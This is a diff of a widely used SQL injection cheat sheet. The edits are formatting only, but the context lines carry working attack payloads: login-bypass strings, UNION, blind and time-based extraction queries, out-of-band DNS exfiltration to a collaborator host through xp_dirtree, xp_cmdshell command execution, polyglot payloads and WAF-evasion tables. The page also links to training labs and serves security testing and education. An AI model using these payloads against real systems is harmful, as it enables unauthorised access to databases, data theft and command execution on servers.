@@ -2,10 +2,9 @@
 
 > SQL Injection (SQLi)  is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. SQL Injection is one of the most common and severe types of web application vulnerabilities, enabling attackers to execute arbitrary SQL code on the database. This can lead to unauthorized data access, data manipulation, and, in some cases, full compromise of the database server.
 
-
 ## Summary
 
-* [CheatSheets](#cheatsheets)
+* [CheatSheets](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/)
     * [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
     * [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
     * [OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
@@ -26,7 +25,7 @@
     * [Blind Error Based Injection](#blind-error-based-injection)
     * [Time Based Injection](#time-based-injection)
     * [Out of Band (OAST)](#out-of-band-oast)
-* [Stack Based Injection](#stack-based-injection)
+* [Stacked Based Injection](#stacked-based-injection)
 * [Polyglot Injection](#polyglot-injection)
 * [Routed Injection](#routed-injection)
 * [Second Order SQL Injection](#second-order-sql-injection)
@@ -38,12 +37,10 @@
 * [Labs](#labs)
 * [References](#references)
 
-
 ## Tools
 
 * [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool
 * [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws
-
 
 ## Entry Point Detection
 
@@ -59,6 +56,7 @@ Detecting the entry point in SQL injection (SQLi) involves identifying locations
 
 * **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.
     * Merging characters
+
       ```sql
       `+HERP
       '||'DERP
@@ -67,7 +65,9 @@ Detecting the entry point in SQL injection (SQLi) involves identifying locations
       '%20'HERP
       '%2B'HERP
       ```
+
     * Logic Testing
+
       ```sql
       page.asp?id=1 or 1=1 -- true
       page.asp?id=1' or 1=1 -- true
@@ -76,7 +76,6 @@ Detecting the entry point in SQL injection (SQLi) involves identifying locations
       ```
 
 * **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.
-
 
 ## DBMS Identification
 
@@ -109,7 +108,6 @@ Certain SQL keywords are specific to particular database management systems (DBM
 | MSACCESS            | `val(cvar(1))=1` |
 | MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |
 
-
 ### DBMS Identification Error Based
 
 Different DBMSs return distinct error messages when they encounter issues. By triggering errors and examining the specific messages sent back by the database, you can often identify the type of DBMS the website is using.
@@ -126,11 +124,9 @@ Different DBMSs return distinct error messages when they encounter issues. By tr
 | Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |
 | Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |
 
-
-
 ## Authentication Bypass
 
-In a standard authentication mechanism, users provide a username and password. The application typically checks these credentials against a database. For example, a SQL query might look something like this: 
+In a standard authentication mechanism, users provide a username and password. The application typically checks these credentials against a database. For example, a SQL query might look something like this:
 
 ```SQL
 SELECT * FROM users WHERE username = 'user' AND password = 'pass';
@@ -150,7 +146,7 @@ SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
 
 Here, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing the authentication check.
 
-:warning: In this case, the database will return an array of results because it will match every users in the table. This will produce an error in the server side since it was expecting only one result. By adding a `LIMIT` clause, you can restrict the number of rows returned by the query. By submitting the following payload in the username field, you will log in as the first user in the database. Additionally, you can inject a payload in the password field while using the correct username to target a specific user. 
+:warning: In this case, the database will return an array of results because it will match every users in the table. This will produce an error in the server side since it was expecting only one result. By adding a `LIMIT` clause, you can restrict the number of rows returned by the query. By submitting the following payload in the username field, you will log in as the first user in the database. Additionally, you can inject a payload in the password field while using the correct username to target a specific user.
 
 ```sql
 ' or 1=1 limit 1 --
@@ -159,7 +155,6 @@ Here, `'1'='1'` is always true, which means the query could return a valid user,
 :warning: Avoid using this payload indiscriminately, as it always returns true. It could interact with endpoints that may inadvertently delete sessions, files, configurations, or database data.
 
 * [PayloadsAllTheThings/SQL Injection/Intruder/Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)
-
 
 ### Raw MD5 and SHA1
 
@@ -170,7 +165,6 @@ sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
 ```
 
 An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.
-
 
 | Hash | Input    | Output (Raw)            |  Payload  |
 | ---- | -------- | ----------------------- | --------- |
@@ -187,12 +181,11 @@ sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
 sql1 = "SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b'";
 ```
 
-
 ## UNION Based Injection
 
 In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.
 
-Let's assume a vulnerable web application retrieves product details based on a product ID from a database: 
+Let's assume a vulnerable web application retrieves product details based on a product ID from a database:
 
 ```sql
 SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
@@ -212,7 +205,6 @@ SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SE
 
 :warning: The 2 SELECT clauses must have the same number of columns.
 
-
 ## Error Based Injection
 
 Error-Based SQL Injection is a technique that relies on the error messages returned from the database to gather information about the database structure. By manipulating the input parameters of an SQL query, an attacker can make the database generate error messages. These errors can reveal critical details about the database, such as table names, column names, and data types, which can be used to craft further attacks.
@@ -229,11 +221,9 @@ The error will leak the output of the `version()`.
 ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
 ```
 
-
 ## Blind Injection
 
-Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response. 
-
+Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response.
 
 ### Boolean Based Injection
 
@@ -243,14 +233,14 @@ Size of the page, HTTP response code, or missing parts of the page are strong in
 
 Here is a naive example to recover the content of the `@@hostname` variable.
 
-**Identify Injection Point and Confirm Vulnerability** : Inject a payload that evaluates to true/false to confirm SQL injection vulnerability. For example: 
+**Identify Injection Point and Confirm Vulnerability** : Inject a payload that evaluates to true/false to confirm SQL injection vulnerability. For example:
 
 ```ps1
 http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
 http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)
 ```
- 
-**Extract Hostname Length**: Guess the length of the hostname by incrementing until the response indicates a match. For example: 
+
+**Extract Hostname Length**: Guess the length of the hostname by incrementing until the response indicates a match. For example:
 
 ```ps1
 http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
@@ -258,22 +248,20 @@ http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
 http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
 ```
 
-**Extract Hostname Characters** : Extract each character of the hostname using substring and ASCII comparison: 
+**Extract Hostname Characters** : Extract each character of the hostname using substring and ASCII comparison:
 
 ```ps1
 http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
 http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- 
 ```
- 
+
 Then repeat the method to discover every characters of the `@@hostname`. Obviously this example is not the fastest way to obtain them. Here are a few pointers to speed it up:
 
-- Extract characters using dichotomy: it reduces the number of requests from linear to logarithmic time, making data extraction much more efficient. 
-
+* Extract characters using dichotomy: it reduces the number of requests from linear to logarithmic time, making data extraction much more efficient.
 
 ### Blind Error Based Injection
 
 Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.
-
 
 **Example**: Using `json()` function in SQLite to trigger an error as an oracle to know when the injection is true or false.
 
@@ -281,7 +269,6 @@ Attacks rely on sending an SQL query to the database, making the application ret
 ' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
 ' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
 ```
-
 
 ### Time Based Injection
 
@@ -309,12 +296,11 @@ http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(
 
 If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.
 
-
 ### Out of Band (OAST)
 
-Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable. 
+Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable.
 
-Different databases offer various methods for creating out-of-band connections, the most common technique is the DNS exfiltration: 
+Different databases offer various methods for creating out-of-band connections, the most common technique is the DNS exfiltration:
 
 * MySQL
 
@@ -330,7 +316,6 @@ Different databases offer various methods for creating out-of-band connections, 
   exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
   ```
 
-
 ## Stacked Based Injection
 
 Stacked Queries SQL Injection is a technique where multiple SQL statements are executed in a single query, separated by a delimiter such as a semicolon (`;`). This allows an attacker to execute additional malicious SQL commands following a legitimate query. Not all databases or application configurations support stacked queries.
@@ -339,7 +324,6 @@ Stacked Queries SQL Injection is a technique where multiple SQL statements are e
 1; EXEC xp_cmdshell('whoami') --
 ```
 
-
 ## Polyglot Injection
 
 A polygot SQL injection payload is a specially crafted SQL injection attack string that can successfully execute in multiple contexts or environments without modification. This means that the payload can bypass different types of validation, parsing, or execution logic in a web application or database by being valid SQL in various scenarios.
@@ -347,7 +331,6 @@ A polygot SQL injection payload is a specially crafted SQL injection attack stri
 ```sql
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
-
 
 ## Routed Injection
 
@@ -371,7 +354,6 @@ In short, the result of the first SQL query is used to build the second SQL quer
 -1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
 ```
 
-
 ## Second Order SQL Injection
 
 Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.
@@ -382,7 +364,6 @@ password="P@ssw0rd"
 ```
 
 Since you are inserting your payload in the database for a later use, any other type of injections can be used UNION, ERROR, BLIND, STACKED, etc.
-
 
 ## Generic WAF Bypass
 
@@ -403,12 +384,11 @@ Bypass using whitespace alternatives.
 | DBMS       | ASCII characters in hexadecimal |
 | ---------- | ------------------------------- |
 | SQLite3    | 0A, 0D, 0C, 09, 20 |
-| MySQL	5    | 09, 0A, 0B, 0C, 0D, A0, 20 |
-| MySQL	3	   | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
+| MySQL 5    | 09, 0A, 0B, 0C, 0D, A0, 20 |
+| MySQL 3    | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
 | PostgreSQL | 0A, 0D, 0C, 09, 20 |
 | Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
 | MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
-
 
 Bypass using comments and parenthesis.
 
@@ -418,9 +398,8 @@ Bypass using comments and parenthesis.
 | `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |
 | `?id=(1)and(1)=(1)--`                     | Parenthesis          |
 
- 
 ### No Comma Allowed
- 
+
 Bypass using `OFFSET`, `FROM` and `JOIN`.
 
 | Forbidden           | Bypass |
@@ -429,11 +408,9 @@ Bypass using `OFFSET`, `FROM` and `JOIN`.
 | `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)` |
 | `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |
 
-
 ### No Equal Allowed
 
 Bypass using LIKE/NOT IN/IN/BETWEEN
-
 
 | Bypass    | SQL Example |
 | --------- | ------------------------------------------ |
@@ -441,7 +418,6 @@ Bypass using LIKE/NOT IN/IN/BETWEEN
 | `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |
 | `IN`      | `SUBSTRING(VERSION(),1,1)IN(4,3)`          |
 | `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |
-
 
 ### Case Modification
 
@@ -453,7 +429,6 @@ Bypass using uppercase/lowercase.
 | `and`     | Lowercase  |
 | `aNd`     | Mixed case |
 
-
 Bypass using keywords case insensitive or an equivalent operator.
 
 | Forbidden | Bypass                      |
@@ -464,8 +439,7 @@ Bypass using keywords case insensitive or an equivalent operator.
 | `>`       | `NOT BETWEEN 0 AND X`       |
 | `WHERE`   | `HAVING`                    |
 
-
-## Labs 
+## Labs
 
 * [PortSwigger - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
 * [PortSwigger - SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
@@ -484,7 +458,6 @@ Bypass using keywords case insensitive or an equivalent operator.
 * [Root Me - SQL injection - Second Order](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Second-Order)
 * [Root Me - SQL injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)
 * [Root Me - SQL Truncation](https://www.root-me.org/en/Challenges/Web-Server/SQL-Truncation)
-
 
 ## References
 
